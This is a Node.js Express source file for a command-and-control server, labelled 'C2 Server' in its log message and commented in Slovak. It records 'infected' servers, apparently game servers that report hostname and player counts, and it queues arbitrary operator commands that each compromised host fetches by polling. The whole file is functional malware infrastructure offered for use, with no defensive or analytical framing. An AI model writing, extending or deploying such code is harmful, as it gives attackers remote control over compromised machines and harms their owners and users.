const express = require('express');
const cors = require('cors');
const path = require('path');
const app = express();

app.use(express.json());
app.use(cors());

// Nastavenie cesty k frontendu
const frontendPath = path.join(__dirname, 'frontend');
app.use(express.static(frontendPath));

let infectedServers = []; 
let serverCommands = {}; 

app.post('/api/report', (req, res) => {
    // Oprava: Kontrola, či rawIp existuje, aby server nepadol (Status 254)
    const rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || "0.0.0.0";
    const cleanIp = rawIp.replace('::ffff:', '').split(',')[0].trim();

    const newServer = {
        ip: cleanIp,
        hostname: req.body.hostname || "Neznámy Server",
        players: req.body.players || 0,
        lastSeen: new Date().toLocaleTimeString('sk-SK')
    };

    const index = infectedServers.findIndex(s => s.ip === newServer.ip);
    if (index > -1) { infectedServers[index] = newServer; } 
    else { infectedServers.push(newServer); }
    res.status(200).send({ status: "ok" });
});

app.get('/api/list', (req, res) => { res.json(infectedServers); });

app.get('/api/get-commands', (req, res) => {
    const rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || "0.0.0.0";
    const cleanIp = rawIp.replace('::ffff:', '').split(',')[0].trim();
    const cmds = serverCommands[cleanIp] || [];
    serverCommands[cleanIp] = []; 
    res.json(cmds);
});

app.post('/api/send-command', (req, res) => {
    const { ip, command } = req.body;
    if (!ip || !command) return res.status(400).send({ error: "Chýba IP alebo príkaz" });
    if (!serverCommands[ip]) serverCommands[ip] = [];
    serverCommands[ip].push(command);
    res.json({ status: "queued" });
});

// Oprava ciest pre Render
app.get('/', (req, res) => { res.sendFile(path.join(frontendPath, 'index.html')); });
app.get('/manage.html', (req, res) => { res.sendFile(path.join(frontendPath, 'manage.html')); });

const PORT = process.env.PORT || 10000; 
app.listen(PORT, '0.0.0.0', () => { console.log(`C2 Server beží na porte ${PORT}`); });